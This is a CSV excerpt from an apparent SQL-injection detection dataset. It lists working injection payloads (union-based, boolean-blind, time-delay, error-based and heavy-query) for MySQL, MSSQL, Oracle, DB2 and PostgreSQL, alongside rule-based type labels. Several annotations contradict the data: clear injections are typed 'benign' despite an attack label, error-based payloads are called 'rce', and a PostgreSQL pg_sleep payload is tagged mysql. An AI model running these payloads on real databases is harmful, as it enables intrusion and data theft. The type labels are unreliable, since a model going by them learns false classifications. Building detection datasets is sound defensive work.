row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
10140,1'+ ( select hkrg where 3665 = 3665,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10141,"-5431"" ) ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""ipmo"" = ""ipmo",1,,error_based,oracle,0.95,dbms_utility detected — error_based injection (priority 4) on oracle,rule-based
10142,1' ) rlike ( select ( case when ( 9308 = 2540 ) then 1 else 0x28 end ) ) and ( 'rghd' = 'rghd,1,,boolean_blind,generic,0.95,") and (, rlike  detected — boolean_blind injection (priority 8) on generic",rule-based
10143,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and '%' = '",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
10144,select ( case when ( 9907 = 2736 ) then 9907 else 9907* ( select 9907 from mysql.db ) end ) #,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10145,end and ( ( 2160 = 2160,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10146,"-2855"" ) ) ) union all select 1496,1496,1496,1496#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10147,"-8544%"" or 6872 = 6872 and ""%"" = """,1,,boolean_blind,generic,0.95,6872 = 6872 and detected — boolean_blind injection (priority 8) on generic,rule-based
10148,"1%' and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and '%' = '",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
10149,"-8703' ) where 9723 = 9723 union all select 9723,9723,9723,9723,9723#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10150,"1"" or sleep ( 5 ) #",1,,time_blind,mysql,0.95,"sleep (, or sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
10151,1' ) ) ) waitfor delay '0:0:5'--,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
10152,"1"" ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ""umfr"" like ""umfr",1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
10153,-8809'|| ( select 'hyzr' where 5694 = 5694 union all select 5694--,1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10154,-3107' ) where 7782 = 7782 or 8571 = 8571--,1,,boolean_blind,generic,0.95,7782 = 7782 or detected — boolean_blind injection (priority 8) on generic,rule-based
10155,"1"" ) where 4878 = 4878 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
10156,1' and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and 'lvyw' = 'lvyw,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10157,"-6263"" union all select 8005,8005#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10158,"1' and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) )",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
10159,"1' or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
10160,"-8793' where 3853 = 3853 union all select 3853,3853,3853,3853,3853,3853,3853,3853#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
